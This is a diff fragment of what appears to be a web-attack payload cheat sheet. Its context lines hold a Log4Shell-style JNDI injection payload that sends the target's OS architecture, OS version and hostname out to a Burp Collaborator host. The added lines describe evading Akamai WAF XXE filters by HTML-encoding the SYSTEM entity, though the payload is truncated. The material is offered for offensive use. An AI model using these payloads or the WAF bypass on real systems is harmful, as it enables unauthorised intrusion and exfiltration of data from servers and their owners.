@@ -104,3 +104,7 @@ Paylaod : ${jndi:ldap://${Command}XXXX${::-.}http://burpcollaborator.net}zzzz
 Command 
 sys:os.arch & sys:os.version &  hostName
 ----------------------------------------------------------------------------------------------------------------------------------------------------
+You can bypass Akamai WAF's XXE filters by HTML encoding the SYSTEM entity within a payload like this: 
+
+<!DOCTYPE foo [<!ENTITY % a "&#x3c;&#x21; ... omitted ...
+-----------------------------------------------------------------------------------------------------------------------------------------------------
